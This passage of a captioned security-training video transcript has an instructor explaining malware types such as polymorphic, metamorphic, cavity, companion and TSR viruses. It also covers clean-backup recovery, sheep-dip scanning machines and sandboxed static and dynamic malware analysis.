and\n\n320\n00:14:28.950 --> 00:14:32.460\nthey've blown the systems up and they've\nrestored data from other mechanisms.\n\n321\n00:14:32.460 --> 00:14:34.600\nYou know, you've gotta have\nmultiple layers of protection.\n\n322\n00:14:34.600 --> 00:14:37.740\nBackups, that are available\nin different formats,\n\n323\n00:14:37.740 --> 00:14:39.920\ndisconnected from the main systems.\n\n324\n00:14:39.920 --> 00:14:44.230\nYou have a securely stored cloud-based\nbackups today that can be used.\n\n325\n00:14:44.230 --> 00:14:46.300\nAll sorts of things\nare gonna play in here.\n\n326\n00:14:46.300 --> 00:14:49.410\nYou know, if you have to restore data,\nif you have a virus, or root kit or\n\n327\n00:14:49.410 --> 00:14:53.710\nmalware running rampant the best way to do\nit is to blow up the system, reformat it,\n\n328\n00:14:53.710 --> 00:14:54.860\nstart from scratch.\n\n329\n00:14:54.860 --> 00:14:57.820\nAnd then restore data from\nan uncompromised back up.\n\n330\n00:14:57.820 --> 00:15:01.040\nThings like whether it's carbonite or\nany of the online back up systems or\n\n331\n00:15:01.040 --> 00:15:05.410\nwhatever they are, are good place to\nthink about volting that information.\n\n332\n00:15:05.410 --> 00:15:08.330\nBut you've obviously got to be secure in\nyour knowledge that that stuff has not\n\n333\n00:15:08.330 --> 00:15:09.430\nbeen compromised, right?\n\n334\n00:15:09.430 --> 00:15:11.630\nAnd so that's something else to consider.\n\n335\n00:15:11.630 --> 00:15:16.210\nThe online vendor may or may not run\nvirus scans while data's in storage.\n\n336\n00:15:16.210 --> 00:15:20.480\nYou have to understand you may have to\nrestore that data down to a clean machine.\n\n337\n00:15:20.480 --> 00:15:23.430\nValidate it by scanning it\nbefore you then move it into\n\n338\n00:15:23.430 --> 00:15:26.950\nthe new version of the production\nmachine to ensure that it's clean.\n\n339\n00:15:26.950 --> 00:15:28.610\nBecause we often will back stuff up.\n\n340\n00:15:28.610 --> 00:15:31.660\nBut the problem is if the malware\nhas affected the files,\n\n341\n00:15:31.660 --> 00:15:33.400\nyou may be backing up infected files.\n\n342\n00:15:33.400 --> 00:15:36.180\nAnd you may not realize those\nfiles have been compromised.\n\n343\n00:15:36.180 --> 00:15:38.360\nI've had this happen\nnumerous times with clients.\n\n344\n00:15:38.360 --> 00:15:40.800\nAnd obviously as a result,\nwe pull that stuff down, and boom,\n\n345\n00:15:40.800 --> 00:15:42.760\nyou're reinfected and it propagates again.\n\n346\n00:15:42.760 --> 00:15:45.190\nAnd it's the vicious circle of life,\nas we say, right?\n\n347\n00:15:45.190 --> 00:15:47.335\nSo want to keep that in mind.\n\n348\n00:15:47.335 --> 00:15:50.397\nDifferent types of viruses,\nthings system or boot sector viruses,\n\n349\n00:15:50.397 --> 00:15:53.822\nnot as popular as they used to be, but we\nused to get a lot of boot sector viruses\n\n350\n00:15:53.822 --> 00:15:57.554\nwhen we used floppies, for instance, you\nwould get boot sector viruses off them.\n\n351\n00:15:57.554 --> 00:15:59.284\nWe have stealth or tunneling viruses.\n\n352\n00:15:59.284 --> 00:16:00.616\nWe talked about some of them.\n\n353\n00:16:00.616 --> 00:16:02.490\nEncryptor viruses, polymorphic and\n\n354\n00:16:02.490 --> 00:16:04.838\nmenomorphic viruses\nwe'll talk about those.\n\n355\n00:16:04.838 --> 00:16:09.040\nThose are ones that rewrite themselves and\nchange their code in one form or another.\n\n356\n00:16:09.040 --> 00:16:10.280\nNasty little buggers.\n\n357\n00:16:10.280 --> 00:16:13.160\nThey basically change\nevery time they execute so\n\n358\n00:16:13.160 --> 00:16:19.260\nyour av scanners are looking for\nABC 123, and now it's ABC 567,\n\n359\n00:16:19.260 --> 00:16:23.830\nand it's DEF 709, and\nall this crazy stuff.\n\n360\n00:16:23.830 --> 00:16:28.370\nAnd you're essentially creating a brand\nnew variant every time the virus is gonna\n\n361\n00:16:28.370 --> 00:16:28.971\nexecute.\n\n362\n00:16:28.971 --> 00:16:33.491\nAnd as a result, AV scanners cannot keep\nup, because we just don't have the ability\n\n363\n00:16:33.491 --> 00:16:37.390\nto create these changing definitions\nto match what we see in the system.\n\n364\n00:16:37.390 --> 00:16:41.353\nSo this is a newer class of viruses that\nhave proven to be very problematic under\n\n365\n00:16:41.353 --> 00:16:44.791\nthe general guides of APT,\nAdvanced Persistent Threats, today.\n\n366\n00:16:44.791 --> 00:16:47.926\nOverriding or cavity viruses,\nwhich again, are kinda older, but\n\n367\n00:16:47.926 --> 00:16:49.360\nthey'll just corrupt stuff.\n\n368\n00:16:49.360 --> 00:16:51.350\nThey'll just go in and carve out files.\n\n369\n00:16:51.350 --> 00:16:53.400\nYou've got all sorts of different kinds.\n\n370\n00:16:53.400 --> 00:16:58.972\nYou get sparse infector, shell viruses,\nfile extension viruses, TSR, Terminate and\n\n371\n00:16:58.972 --> 00:17:03.110\nstay resident viruses that infect\nthe boot sectors and will stay in memory.\n\n372\n00:17:03.110 --> 00:17:07.090\nYou're getting add on viruses\nthat come down from add ons.\n\n373\n00:17:07.090 --> 00:17:10.150\nYou get macro viruses so\nremember like the Melissa virus and\n\n374\n00:17:10.150 --> 00:17:13.220\nI love you and\nthing like that multi part type viruses.\n\n375\n00:17:13.220 --> 00:17:16.640\nThere's all these different types of\nviruses that we wanna be aware of.\n\n376\n00:17:16.640 --> 00:17:20.520\nSystem or boot sector viruses I\nsaid will move into the MBR or\n\n377\n00:17:20.520 --> 00:17:23.640\nin another location on the hard drive and\ncopy themselves in.\n\n378\n00:17:23.640 --> 00:17:27.070\nAnd will then, when you go to boot,\nthe virus inserts itself and\n\n379\n00:17:27.070 --> 00:17:30.750\nexecutes first, and then control is\npassed over to the original MBR.\n\n380\n00:17:30.750 --> 00:17:33.940\nSo it's like a rootkit,\nit sits below the kernel in the system\n\n381\n00:17:33.940 --> 00:17:37.730\ncontrolling all access, and it essentially\nhas control over the system, as a result.\n\n382\n00:17:37.730 --> 00:17:41.770\nSo, it swaps itself in, essentially, and\nattempts to execute underneath that.\n\n383\n00:17:41.770 --> 00:17:44.160\nWhich can be a problem, obviously.\n\n384\n00:17:44.160 --> 00:17:48.170\nFile in multi-partite viruses are going\nto infect various system files.\n\n385\n00:17:48.170 --> 00:17:53.900\nFile viruses will attach a certain file\ntypes, eo.com.exe.sys you know whatever.\n\n386\n00:17:53.900 --> 00:17:58.250\nAnd they will infect those multi-partite\nviruses infect the boot sector and\n\n387\n00:17:58.250 --> 00:17:59.740\nexecutables at the same time.\n\n388\n00:17:59.740 --> 00:18:03.385\nSo they kinda combine file and\nboot sector viruses together.\n\n389\n00:18:03.385 --> 00:18:06.960\nMulti-partite, multiple parts,\nthey will infect multiple systems and\n\n390\n00:18:06.960 --> 00:18:08.690\nsystem parts simultaneously.\n\n391\n00:18:08.690 --> 00:18:11.670\nWe've talked about macro\nviruses those infection\n\n392\n00:18:11.670 --> 00:18:14.070\nthat spread through\nprograms that use macros.\n\n393\n00:18:14.070 --> 00:18:17.410\nMicrosoft Word is the best example that\nwe often think about that as I said.\n\n394\n00:18:17.410 --> 00:18:20.318\nBut VBA, Visual Basic for\nApplications, Excel,\n\n395\n00:18:20.318 --> 00:18:23.569\nany of those areas where you\nfind this kinda capability.\n\n396\n00:18:23.569 --> 00:18:27.548\nThere used to be whole host of\nVBA viruses that would spread and\n\n397\n00:18:27.548 --> 00:18:31.820\nas I said I love you and\nMelissa were examples of this early on.\n\n398\n00:18:31.820 --> 00:18:35.440\nCluster viruses,\nthey modify directory table entries, so\n\n399\n00:18:35.440 --> 00:18:39.540\nthat users are pointed to system processes\nthat are not actually system processes,\n\n400\n00:18:39.540 --> 00:18:41.130\nbut are the virus code themself.\n\n401\n00:18:41.130 --> 00:18:43.240\nSo they're actually being\ncontrolled by the virus.\n\n402\n00:18:43.240 --> 00:18:46.230\nSo we'll go in and\nmodify all sorts of entries for that.\n\n403\n00:18:46.230 --> 00:18:49.630\nSo imagine we're actually able to\nrewrite system variable plots.\n\n404\n00:18:49.630 --> 00:18:54.271\nSo we can say system variable\nC:\\windows system 32\\Winword.exe equals\n\n405\n00:18:54.271 --> 00:18:58.930\nreally something else in the virus\ncontrols that even though it's mapped.\n\n406\n00:18:58.930 --> 00:19:03.040\nAnd looks it as if it is that way so\nwe can modify the virus,\n\n407\n00:19:03.040 --> 00:19:05.670\nwe can modify the way in\nwhich these systems work.\n\n408\n00:19:05.670 --> 00:19:08.230\nEncryption viruses that will encrypt or\n\n409\n00:19:08.230 --> 00:19:12.522\nuse encryption to essentially be\nable not to only hide themselves so\n\n410\n00:19:12.522 --> 00:19:16.607\nthough you use simple encryption\nto encypher the actual virus.\n\n411\n00:19:16.607 --> 00:19:20.972\nBut each one of those variations\nis encrypted with a different key.\n\n412\n00:19:20.972 --> 00:19:23.944\nAnd as a result of that we got out and\nwe infect a bunch of files and\n\n413\n00:19:23.944 --> 00:19:27.270\nwe encrypt those files and we have\na different key that opens each one.\n\n414\n00:19:27.270 --> 00:19:29.150\nSo you may get rid of the virus, but\n\n415\n00:19:29.150 --> 00:19:31.350\nthen there's all this stuff left\nbehind that's been modified.\n\n416\n00:19:31.350 --> 00:19:34.420\nAnd without those keys,\nyou can't actually disinfect the system.\n\n417\n00:19:34.420 --> 00:19:35.240\nAnd as a result of that,\n\n418\n00:19:35.240 --> 00:19:38.992\nwe can't detect all these different\ntypes of files that are sitting there.\n\n419\n00:19:38.992 --> 00:19:43.252\nWhich again, if you think about the\nintelligence it takes to walk through this\n\n420\n00:19:43.252 --> 00:19:47.634\nand say, well, if I was a virus, and I was\na virus maker, and if I was an AV maker,\n\n421\n00:19:47.634 --> 00:19:49.271\nhow would I attack the virus?\n\n422\n00:19:49.271 --> 00:19:52.409\nAnd then the virus makers go through and\nsay, well, let me change this,\n\n423\n00:19:52.409 --> 00:19:53.790\nlet me change that..\n\n424\n00:19:53.790 --> 00:19:57.670\nI know you're gonna come after this file,\nlet me rename it, let me do this.\n\n425\n00:19:57.670 --> 00:19:58.970\nThey're coming up with variations.\n\n426\n00:19:58.970 --> 00:20:01.050\nThis is essentially the same\nthing as the radar detectors and\n\n427\n00:20:01.050 --> 00:20:02.407\nthe radar gun manufacturers, right?\n\n428\n00:20:02.407 --> 00:20:04.981\n&gt;&gt; [LAUGH]\n&gt;&gt; So what's the latest advance in one and\n\n429\n00:20:04.981 --> 00:20:07.003\nlet's knock that off and counter that and\n\n430\n00:20:07.003 --> 00:20:09.720\nthen it's kind of that\nongoing stair step battle.\n\n431\n00:20:09.720 --> 00:20:11.400\nBut this is how it happens.\n\n432\n00:20:11.400 --> 00:20:14.630\nThe AV guys will come up with a new and\ninnovative technology.\n\n433\n00:20:14.630 --> 00:20:18.149\nAnd then the virus guys will sit back and\nsay okay, so they've figured out how to do\n\n434\n00:20:18.149 --> 00:20:21.478\nthis, now let's come up with a new way to\nthis so we can get the better of them.\n\n435\n00:20:21.478 --> 00:20:23.140\nAnd this goes back and forth.\n\n436\n00:20:23.140 --> 00:20:26.550\nPolymorphic code and\nmetamorphic, there's a key but\n\n437\n00:20:26.550 --> 00:20:28.030\nsubtle difference between the two.\n\n438\n00:20:28.030 --> 00:20:29.700\nI just wanna talk about this for a minute.\n\n439\n00:20:29.700 --> 00:20:32.610\nSo, polymorphic code is\nessentially a code that mutates,\n\n440\n00:20:32.610 --> 00:20:36.630\nbut it keeps the original core\nthe algorithm of the virus intact.\n\n441\n00:20:36.630 --> 00:20:38.010\nAnd so, when we name the poly,\n\n442\n00:20:38.010 --> 00:20:41.320\nwhen the virus is polymorphic,\nwe have some sort of mutating engine.\n\n443\n00:20:41.320 --> 00:20:43.014\nA polymorphic engine traditionally,\n\n444\n00:20:43.014 --> 00:20:45.620\nsometimes as I said\ncalled a mutating engine.\n\n445\n00:20:45.620 --> 00:20:49.700\nAnd as a result of that no parts of\nthe virus will actually ultimately remain\n\n446\n00:20:49.700 --> 00:20:52.639\nthe same, but\nparts are constantly in motion right?\n\n447\n00:20:52.639 --> 00:20:56.528\nAnd so we wanna think about the fact\nthat with a polymorphic virus you're\n\n448\n00:20:56.528 --> 00:21:01.020\ngonna see a change in the code, but not\nthe whole thing changing at once, right?\n\n449\n00:21:01.020 --> 00:21:05.954\nBut a metamorphic virus, or metamorphic\ncode, it's often referred to either way,\n\n450\n00:21:05.954 --> 00:21:10.821\nwill actually change the entire virus by\nrewriting itself start-to-finish every\n\n451\n00:21:10.821 --> 00:21:12.618\ntime it essentially infects.\n\n452\n00:21:12.618 --> 00:21:15.770\nAnd so, whenever you get\ninfected with metamorphic viruses\n\n453\n00:21:15.770 --> 00:21:18.265\nyou get a brand new variant every time.\n\n454\n00:21:18.265 --> 00:21:21.645\nAs opposed to polymorphic\nwhich will change elements but\n\n455\n00:21:21.645 --> 00:21:24.680\nsome of it will look and\nfeel the same at any given moment.\n\n456\n00:21:24.680 --> 00:21:27.080\nSo, you may have six elements,\nthree of them will modify,\n\n457\n00:21:27.080 --> 00:21:29.460\nthree will stay the same\nwith a polymorphic.\n\n458\n00:21:29.460 --> 00:21:32.650\nWith a metamorphic,\nthe entire virus essentially is brand new.\n\n459\n00:21:32.650 --> 00:21:33.610\nIt's like you spin the wheel and\n\n460\n00:21:33.610 --> 00:21:37.330\nthere's a brand new virus that pops out\nthe other side every time it infects.\n\n461\n00:21:37.330 --> 00:21:39.670\nAs a result of that,\nit's almost impossible for\n\n462\n00:21:39.670 --> 00:21:43.802\nus to find a metamorphic virus and\nactually deal with it in real time.\n\n463\n00:21:43.802 --> 00:21:46.850\nJust very, very few things that\ncan be used to detect this.\n\n464\n00:21:46.850 --> 00:21:48.643\nYou may have heuristic scanners and\n\n465\n00:21:48.643 --> 00:21:52.330\nartificial intelligence scanners\nthat create general baselines.\n\n466\n00:21:52.330 --> 00:21:55.900\nSo you got the protection baseline and the\nsystem overall, and then anything that is\n\n467\n00:21:55.900 --> 00:21:59.550\nfound to modify or be a deviant\nfrom that through a gap analysis or\n\n468\n00:21:59.550 --> 00:22:02.710\na delta, such would change\nblock management, will look at.\n\n469\n00:22:02.710 --> 00:22:05.340\nBut the problem is there's\nlots of files to change and so\n\n470\n00:22:05.340 --> 00:22:08.340\nthis is not always gonna\nzero in on just the virus.\n\n471\n00:22:08.340 --> 00:22:11.090\nThere's hundreds of files in theory\nthat are constantly changing\n\n472\n00:22:11.090 --> 00:22:12.770\ninside a system in a given moment.\n\n473\n00:22:12.770 --> 00:22:15.230\nSo you got to think about\nall the different types.\n\n474\n00:22:15.230 --> 00:22:19.140\nFile overriding or cavity viruses,\noverride a part of the host file.\n\n475\n00:22:19.140 --> 00:22:23.935\nAnd they will let's say you infect the\nfile called mybankinfo.txt we're gonna go\n\n476\n00:22:23.935 --> 00:22:28.333\ngoing in and overwrite a bunch of that\nstuff with nulls or zeros out the data.\n\n477\n00:22:28.333 --> 00:22:30.180\nEssentially just wiping it out.\n\n478\n00:22:30.180 --> 00:22:31.908\nAnd that's what this kind of virus does.\n\n479\n00:22:31.908 --> 00:22:35.470\nIt just carves out the data in\nthe file and rewrites it with nulls or\n\n480\n00:22:35.470 --> 00:22:36.690\nwhatever it may do.\n\n481\n00:22:36.690 --> 00:22:39.880\nRendering the file enacts inaccessible and\nor useless.\n\n482\n00:22:39.880 --> 00:22:42.880\nAnd that can be a problem if\nyou get a virus like that and\n\n483\n00:22:42.880 --> 00:22:46.180\nthat propagates into\nyour backup of your data.\n\n484\n00:22:46.180 --> 00:22:47.470\nAnd you start restoring that stuff,\n\n485\n00:22:47.470 --> 00:22:51.200\nit could spread to all sorts of stuff\nwhich obviously can be an issue.\n\n486\n00:22:51.200 --> 00:22:55.084\nThere's sparse infector viruses, these\nessentially will infect only occasionally.\n\n487\n00:22:55.084 --> 00:22:59.570\nThey'll go live every 10th or\n20th boot up of the system.\n\n488\n00:22:59.570 --> 00:23:01.460\nInfect for awhile, then go dormant again.\n\n489\n00:23:01.460 --> 00:23:02.860\nSo they'll wake up, hibernate,\n\n490\n00:23:02.860 --> 00:23:05.670\nwake up, hibernate,\nhence the concept, sparse infectors.\n\n491\n00:23:05.670 --> 00:23:08.711\nThey only infect for a certain period\nof time and then they go away.\n\n492\n00:23:08.711 --> 00:23:11.132\nThere's companion or camouflage viruses,\n\n493\n00:23:11.132 --> 00:23:14.707\nthey create a companion file that\nessentially looks legitimate.\n\n494\n00:23:14.707 --> 00:23:17.095\nAnd they'll save themselves\nas something else.\n\n495\n00:23:17.095 --> 00:23:18.819\nAnd pretend to be something they're not.\n\n496\n00:23:18.819 --> 00:23:21.530\nAnd so they'll try to camouflage\nthemselves right inside the system.\n\n497\n00:23:21.530 --> 00:23:26.825\nSo, notepad.exe, we'll get a friend or\na buddy called notepad.com and\n\n498\n00:23:26.825 --> 00:23:31.230\nnotepad.com is the bad virus, but\nwe may not know that or notice that.\n\n499\n00:23:31.230 --> 00:23:33.270\nSo stuff like that will happen.\n\n500\n00:23:33.270 --> 00:23:34.432\nShell viruses,\n\n501\n00:23:34.432 --> 00:23:39.834\nthis is going to deal with anything that\nis gonna be running the booth sector.\n\n502\n00:23:39.834 --> 00:23:43.370\nSo all the boot viruses that initially try\nto infect are gonna be considered shell\n\n503\n00:23:43.370 --> 00:23:45.500\nvirus, it's just another word for them.\n\n504\n00:23:45.500 --> 00:23:49.990\nThey're gonna try to execute as\nthe system is trying to boot up, right?\n\n505\n00:23:49.990 --> 00:23:52.220\nSo that's what we're looking at.\n\n506\n00:23:52.220 --> 00:23:56.808\nA virus code that forms a shell around\nthe target host's program code,\n\n507\n00:23:56.808 --> 00:23:59.670\nput the apostrophe s in the right place.\n\n508\n00:23:59.670 --> 00:24:02.316\nMaking it look like it's\nthe original software,\n\n509\n00:24:02.316 --> 00:24:04.399\nwill also be considered a shell virus.\n\n510\n00:24:04.399 --> 00:24:07.270\nIt forms a shell, in other words,\naround other stuff.\n\n511\n00:24:07.270 --> 00:24:09.110\nWe talked about file extension viruses.\n\n512\n00:24:09.110 --> 00:24:13.460\nI talked about the fact that we\ncould rename a file, extending it,\n\n513\n00:24:13.460 --> 00:24:15.680\nadding another file type on it.\n\n514\n00:24:15.680 --> 00:24:18.280\nAnd a lot of times,\nfile viruses will take this concept and\n\n515\n00:24:18.280 --> 00:24:20.460\nthey'll change their extensions to hide.\n\n516\n00:24:20.460 --> 00:24:22.912\nSo they'll become text files and\nthen they'll morph and\n\n517\n00:24:22.912 --> 00:24:26.765\nthen become executables launch and\nthen go back and become dormant again.\n\n518\n00:24:26.765 --> 00:24:30.360\nSo if you're not looking at system file\nextensions, if you're not looking at\n\n519\n00:24:30.360 --> 00:24:34.350\ncomplete path to see double extension\nfiles, this could lead to infection.\n\n520\n00:24:34.350 --> 00:24:37.810\nYou may not realize that stuff is there,\nbut that can be a problem.\n\n521\n00:24:37.810 --> 00:24:40.430\nAdd on and\nintrusive virus as we talked about this.\n\n522\n00:24:40.430 --> 00:24:43.890\nWe append their code out to\none of the original programs,\n\n523\n00:24:43.890 --> 00:24:46.540\nadding on almost like\ndownloading an add-in, but\n\n524\n00:24:46.540 --> 00:24:49.800\nyou're adding on code to an original\npiece of code that's good.\n\n525\n00:24:49.800 --> 00:24:52.570\nWho looks at the entire code string and\nsays, those last four characters,\n\n526\n00:24:52.570 --> 00:24:53.490\nthat's bad.\n\n527\n00:24:53.490 --> 00:24:56.570\nSo if we stick code in there,\nwe may be able to hide the virus and\n\n528\n00:24:56.570 --> 00:24:58.330\npropagate it when nobody's looking.\n\n529\n00:24:58.330 --> 00:25:01.430\nWe have what are called transient or\nterminate and\n\n530\n00:25:01.430 --> 00:25:04.580\nstay resident programs\nthat are called TSRs.\n\n531\n00:25:04.580 --> 00:25:05.910\nSo these are going to\n\n532\n00:25:07.250 --> 00:25:11.870\nallow us to be able to essentially have\na dynamic virus that runs in memory.\n\n533\n00:25:11.870 --> 00:25:14.362\nThe virus runs when the host\ncode is run and terminates or\n\n534\n00:25:14.362 --> 00:25:16.015\nexits as soon as the memory is wiped.\n\n535\n00:25:16.015 --> 00:25:19.117\nSo essentially, we'll infect the system,\nstay in memory,\n\n536\n00:25:19.117 --> 00:25:20.738\nrun as long as it's available.\n\n537\n00:25:20.738 --> 00:25:22.770\nAnd then it can go away,\nit can terminate, or\n\n538\n00:25:22.770 --> 00:25:26.462\nit can be brought back up again every time\nyou reboot the system we may reinfect, so\n\n539\n00:25:26.462 --> 00:25:29.483\nit's one of those system viruses\nthat'll just keep coming back.\n\n540\n00:25:29.483 --> 00:25:31.541\nGive the gift of love that\nkeeps on giving, right?\n\n541\n00:25:31.541 --> 00:25:32.647\nEssentially, right?\n\n542\n00:25:32.647 --> 00:25:35.658\nSo keep in mind that all sorts\nof virus types exist and\n\n543\n00:25:35.658 --> 00:25:38.072\nwe obviously wanna be aware of that.\n\n544\n00:25:38.072 --> 00:25:39.960\nWe wanna make sure that\nwe're thinking about that.\n\n545\n00:25:39.960 --> 00:25:41.490\nWe've talked about worms and\n\n546\n00:25:41.490 --> 00:25:44.580\nthe fact that worms can go out and\npropagate on their own, right?\n\n547\n00:25:44.580 --> 00:25:47.060\nUnlike viruses,\nthey don't need people to spread them.\n\n548\n00:25:47.060 --> 00:25:51.410\nBut keeping in mind that worms will be\nvery quick to attack because they can jump\n\n549\n00:25:51.410 --> 00:25:53.770\nessentially and\nspread on demand on their own.\n\n550\n00:25:53.770 --> 00:25:57.860\nAs I shared with you, you may hook up\na system within seconds to minutes,\n\n551\n00:25:57.860 --> 00:26:01.210\nthat system can become infected\nfrom a variety of different places.\n\n552\n00:26:01.210 --> 00:26:06.338\nThere what we call reservoirs of\nthis kind of files on Internet and,\n\n553\n00:26:06.338 --> 00:26:09.170\nof course, obviously out in the wild, but\nwe have to be aware of the fact that,\n\n554\n00:26:09.170 --> 00:26:10.950\nthat can be an issue.\n\n555\n00:26:10.950 --> 00:26:13.590\nWe just want take step\nto think about that.\n\n556\n00:26:13.590 --> 00:26:18.757\nA little [COUGH] antivirus gig trivia for\nyou with Vocabulary 101.\n\n557\n00:26:18.757 --> 00:26:21.216\nSo have you ever heard about\na concept called a sheepdip computer?\n\n558\n00:26:21.216 --> 00:26:22.401\n&gt;&gt; I have.\n\n559\n00:26:22.401 --> 00:26:23.102\n&gt;&gt; You have?\n\n560\n00:26:23.102 --> 00:26:23.909\n&gt;&gt; I have, yes.\n\n561\n00:26:23.909 --> 00:26:24.899\n&gt;&gt; Okay, all right, then we're done here.\n\n562\n00:26:24.899 --> 00:26:26.104\n&gt;&gt; That's it, that's all you need to know.\n\n563\n00:26:26.104 --> 00:26:28.939\n&gt;&gt; If Mike knows, we're good,\nwe don't need to say anything else.\n\n564\n00:26:28.939 --> 00:26:34.033\n&gt;&gt; If I'm not mistaken, a sheep dip is\na machine that is laden with anti-virus,\n\n565\n00:26:34.033 --> 00:26:35.886\nanti-malware software and\n\n566\n00:26:35.886 --> 00:26:41.190\nall media that's being brought in goes\nthrough that machine and is scanned?\n\n567\n00:26:41.190 --> 00:26:44.546\n&gt;&gt; Yeah,\nit's essentially like a gatekeeper, right?\n\n568\n00:26:44.546 --> 00:26:46.780\nIt's gonna be a delousing\nstation if you will, right?\n\n569\n00:26:46.780 --> 00:26:50.750\nSo we run everything and it's got\nport monitors and file monitors and\n\n570\n00:26:50.750 --> 00:26:55.280\njust every piece of software you could\nimagine that will run to find anything.\n\n571\n00:26:55.280 --> 00:26:57.600\nAnd it's like that hey,\ngo stand over there,\n\n572\n00:26:57.600 --> 00:27:00.920\nwe're gonna bombard you with x-rays and\nfind out what's going on.\n\n573\n00:27:00.920 --> 00:27:04.870\nSo we run everything through it\nessentially to make sure that nothing is\n\n574\n00:27:04.870 --> 00:27:05.500\ncompromised.\n\n575\n00:27:05.500 --> 00:27:08.870\nAnd if it is we catch it, assuming that,\nof course, if it infects the system,\n\n576\n00:27:08.870 --> 00:27:10.660\nwe can obviously wipe that system out.\n\n577\n00:27:10.660 --> 00:27:14.390\nSo yeah, it's gonna be essentially\nthe system that allows us to do,\n\n578\n00:27:14.390 --> 00:27:17.680\nmore often than not, picket line\ndefense monitoring where we can\n\n579\n00:27:17.680 --> 00:27:19.880\nhave it offline kind of off to the side,\nright?\n\n580\n00:27:19.880 --> 00:27:22.470\nSo we can quarantine everything,\nrun it all through there,\n\n581\n00:27:22.470 --> 00:27:26.710\nplug in the suspect media,\npotentially scan inbound traffic.\n\n582\n00:27:26.710 --> 00:27:29.600\nWe may run our proxies through there,\nso all in down and\n\n583\n00:27:29.600 --> 00:27:31.960\nup on traffic routes\nthrough a system like that.\n\n584\n00:27:31.960 --> 00:27:35.510\nDoes the web application firewall,\nlevel scanning, all the way up and\n\n585\n00:27:35.510 --> 00:27:40.030\ndown the OSI model, and then we can\nthen route that traffic out from there\n\n586\n00:27:40.030 --> 00:27:41.650\nto another system when it's safe.\n\n587\n00:27:41.650 --> 00:27:45.580\nSo yeah, I think systems that runs\nthat kind of scanning solution would\n\n588\n00:27:45.580 --> 00:27:50.150\nbe considered sheepdip computer, so\nfancy term for a pretty nasty job, right?\n\n589\n00:27:50.150 --> 00:27:53.700\nSo you're just gonna take all the junk we\nhave and you're gonna see if you get sick\n\n590\n00:27:53.700 --> 00:27:54.350\nby trying it that's essentially\nwhat we're saying there.\n\n591\n00:27:56.750 --> 00:27:59.019\nBut we should, as a mechanism and\na rule of thumb,\n\n592\n00:27:59.019 --> 00:28:01.070\nalso think about setting up a test bed.\n\n593\n00:28:01.070 --> 00:28:04.262\nWe wanna try to have not\nonly sheepdipped computers.\n\n594\n00:28:04.262 --> 00:28:07.342\nBut today, with the cloud or\nwith virtualization and\n\n595\n00:28:07.342 --> 00:28:11.996\nwith our ability to leverage those systems\nto be able to test a lot of this stuff and\n\n596\n00:28:11.996 --> 00:28:15.420\nto keep it secure in\na memory-isolated environment.\n\n597\n00:28:15.420 --> 00:28:17.330\nGenerically call that a sandbox, right?\n\n598\n00:28:17.330 --> 00:28:21.150\nIf we can do that, we should leverage\nvirtualization to be able to quarantine\n\n599\n00:28:21.150 --> 00:28:24.280\nsystems and to be able to test for\nthings that are going on.\n\n600\n00:28:24.280 --> 00:28:25.290\nSo we should set up a test bed.\n\n601\n00:28:25.290 --> 00:28:27.830\nWe should have a test lab\nwhere we can do static and\n\n602\n00:28:27.830 --> 00:28:31.200\ndynamic analysis of\npotentially infected systems.\n\n603\n00:28:31.200 --> 00:28:35.180\nStatic analysis allows us to look\nat the software by decompiling it,\n\n604\n00:28:35.180 --> 00:28:38.550\nsomething at what I showed you in the\nprior episode where we used the IDA tool.\n\n605\n00:28:38.550 --> 00:28:43.170\nThe IDA tool, the dissembler,\nto be able to go and look at virus code.\n\n606\n00:28:43.170 --> 00:28:44.510\nStatic analysis, in other words,\n\n607\n00:28:44.510 --> 00:28:48.855\ndoes not execute the code where as the\ndynamic analysis or dynamic testing does.\n\n608\n00:28:48.855 --> 00:28:51.990\nAnd we actually run the executable and\nwe see what happens and\n\n609\n00:28:51.990 --> 00:28:55.230\nwe start analyzing the system,\nrecording it to find out what's happening.\n\n610\n00:28:55.230 --> 00:28:58.910\nAnd then we look at all of the infection\nvectors that occur from that.\n\n611\n00:28:58.910 --> 00:29:01.800\nBut if we do this in\na virtualized isolated sandbox,\n\n612\n00:29:01.800 --> 00:29:04.220\nwe can prevent the system\nfrom calling home, right?\n\n613\n00:29:04.220 --> 00:29:07.750\nEssentially and trying to figure this out,\nso we can do that if we need to, so\n\n614\n00:29:07.750 --> 00:29:10.795\njust something to consider and\nto think about.\n\n615\n00:29:10.795 --> 00:29:12.922\nBecause that's also very important for\n\n616\n00:29:12.922 --> 00:29:16.920\nus as ethical hackers to understand that\nthere's nothing wrong with analyzing and\n\n617\n00:29:16.920 --> 00:29:20.090\nexamining what the bad\nactors are looking to do.\n\n618\n00:29:20.090 --> 00:29:21.400\nBut we have to understand and\n\n619\n00:29:21.400 --> 00:29:23.740\nhave the knowledge of how to\ndo it safely and securely.\n\n620\n00:29:23.740 --> 00:29:27.356\nInfecting your own system in order to\nfigure out what's going on is really not\n\n621\n00:29:27.356 --> 00:29:30.428\na good idea, just in case you\nwere wondering about that, right?\n\n622\n00:29:30.428 --> 00:29:33.940\nSo in case you ever had a thought\nof maybe nothing to do and-\n\n623\n00:29:33.940 --> 00:29:35.137\n&gt;&gt; Makes me think of all those movies\n\n624\n00:29:35.137 --> 00:29:37.545\nwhere you've got this doctor\nthat's doing this crazy research.\n\n625\n00:29:37.545 --> 00:29:39.232\n&gt;&gt; Yeah, I'm gonna inject myself,\nlike The Fly, right?\n\n626\n00:29:39.232 --> 00:29:40.052\n&gt;&gt; He gets cutup.\n\n627\n00:29:40.052 --> 00:29:40.662\n&gt;&gt; You remember The Fly\nwith Jeff Goldblum?\n\n628\n00:29:40.662 --> 00:29:41.565\n&gt;&gt; Yeah, I'll just do it all myself.\n\n629\n00:29:41.565 --> 00:29:42.538\nHe makes himself into the fly.\n\n630\n00:29:42.538 --> 00:29:44.488\n&gt;&gt; Right, so you don't want to be\nthat guy don't be the fly, right?\n\n631\n00:29:44.488 --> 00:29:48.932\nDon't be Jeff Goldblum don't become\nthe fly, not a good path for fame and\n\n632\n00:29:48.932 --> 00:29:50.115\nfortune, right?\n\n633\n00:29:50.115 --> 00:29:54.885\nSo when we think about malware analysis, I\nwas saying static versus dynamic analysis,\n\n634\n00:29:54.885 --> 00:29:58.940\nwanna be thinking about that,\nmaking sure we understand the concepts.\n\n635\n00:29:58.940 --> 00:30:00.740\nWhy is it important to do one or\nthe other,\n\n636\n00:30:00.740 --> 00:30:02.500\nit's actually important to do both, right?\n\n637\n00:30:02.500 --> 00:30:04.180\nSo we wanna be thinking about that.\n\n638\n00:30:04.180 --> 00:30:05.550\nThere are all sorts of tools.\n\n639\n00:30:05.550 --> 00:30:08.890\nA lot of the tools that we take a look\nat here, including the web 